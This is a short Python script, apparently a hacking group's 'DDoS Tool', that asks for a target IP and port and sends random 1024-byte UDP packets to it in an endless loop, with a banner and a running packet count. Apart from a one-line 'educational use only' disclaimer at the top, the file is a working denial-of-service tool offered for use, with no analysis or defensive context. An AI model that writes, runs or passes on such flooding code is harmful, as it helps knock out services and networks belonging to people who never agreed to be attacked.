# Author: Cyber Sentinel Bangladesh
# For Educational and Testing Use Only
# Use responsibly on your own infrastructure

import socket
import random
import time
import pyfiglet

def show_banner():
    banner = pyfiglet.figlet_format("CSB")
    print(banner)

def attack(ip, port):
    show_banner()
    print(f"Cyber Sentinel Bangladesh DDoS Tool")
    print(f"Sending packets to {ip}:{port}")
    bytes_data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0

    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"Sent {sent} packet to {ip}:{port}")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    attack(target_ip, target_port)
